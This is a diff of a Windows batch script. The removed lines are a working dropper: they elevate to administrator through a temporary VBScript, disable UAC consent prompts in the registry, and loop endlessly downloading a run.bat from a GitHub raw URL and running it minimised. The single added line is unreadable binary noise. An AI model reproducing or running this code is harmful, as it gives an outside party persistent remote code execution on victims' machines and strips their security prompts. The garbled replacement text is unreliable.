@@ -1,15 +1,1 @@
-@echo off
-set "params=%*"
-cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
-
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
-
-
-:loop
-powershell -Command "while (-not (Test-Connection google.com -Count 1 -Quiet)) { Start-Sleep 5 }"
-start /min powershell -Command "$url = 'https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat'; $tempPath = [System.IO.Path]::Combine($env:TEMP, 'run.bat'); Invoke-WebRequest -Uri $url -OutFile $tempPath; Start-Process $tempPath -Wait; Remove-Item $tempPath"
-timeout /t 30 /nobreak >nul
-REM Quay lại vòng lặp
-goto loop
-exit
+ͺ켕�⇻㴖襚⤊ቺ丿阁掳䐥龘꟦࿻偧鞷磻咕꺌윙幍鍵쭄語나ா赊嘂膞싆㑦疵론蘀他⹸彟韦酫ˠꀎពᮧ琂哵ꮖ�݋㌖宁⁅�峁飃꿶琁螾᫑惥腼慦귚ﯣ왼鬽㵹�㲸璶⣌쁩౪勘ﷀ蛫鉓㗙上⨾ྦꑰ죹葽ꤚ䙓뗦ࣇ褏䯍⸌ǘ鲔파ᶊ��ⴠ⹸迯麹㻬엵ዱ䨔ꢬ텋쒨溱覍�␦豝鐞쉝ಧ㕢縹꫓ᜁ鵭贛壀揂㧬曽셡ꬥ紳ﲗ⼷鈔떯⒪柶⹎辫ᓔ쑇즉핀相Ǉ粜鉓푆얓蔊墽ᔵṌ弭诂૷砄诠ಪ鶲耐콢㬸躒悔∞嶿䶳᥵붦愆㨍凵鿍஬ꯤᑁ䟹໣ʳଌᴪẟ꾁舁檕�蕡ࠃćᔯ⅀믾泽䨳֭봘஖憁ￖ⨼겅ᶟ껝ϓ䛒洉夒ᙂ岊둧젗ԓ偠᪣矂�䪚遺敱�뭐郟꿒Ო횵鰞蓌퉹崕鷥現䢰徯Ꞻ톸㑌界웵ک靖辤폽֖䕃獛꧃ꂃ抪椨�᜔걧⢚ෟ谶휀ꥷᰨ^嵁ᰥ喨鬚ۑ਑鬺旇鿩滼˥쪂ဨꁕ࠲￝噩殀㎘뎗쏥蔄紖䤤䯣᫅ٵ�풻ᬨꠡ퐪�Ƙ鐱棟�紆倔⨄伧四㛪衐폏豙辳玸膻훬晹�呔쎻캭஠衈꫿ꕥ郪ᇯ퉗⠲柑㛬᳽ꯕ﨡㸸᪓탠온稱┫솠ᇭਯ⟄執㚍䁤ᗢ慤漣콤쑓勇∗⟪松춧励撑鴎쇓蚖跾┉ế撸趲釘때쒁刿䣨ᱪ〷䭘䪽聄惡㚣䧊袇獊ຖ�䪧⦱ᓲབྷ≀鏧⏱⣔ꇰ蚶ᴊﮃ覹͎ꨡﶄ颔빢樺䂞輑冢ꌅ샛菌좠젇짥̾ਆ듭�漍涥룵ꙏ峄瀍轢炶굽꺱Ⓩᶍ疠�楳⨍יִٔᚹ᝖魰凇œꨓ֗䣪潻훦೟瀷럴指⻢꾦匛ﬂ㫾ᝓﰊ꠩ῌ⯱祈휼ױ䭫ᅛ틖⵷덟Ꮥ䢋ᛢ膊ࢼ䯐통媻䁝댡툕歓츺좂廭ꦀᛥ䃷䠀䀃덾ꡧਗ✆磎摈﬑졡蹊࣑
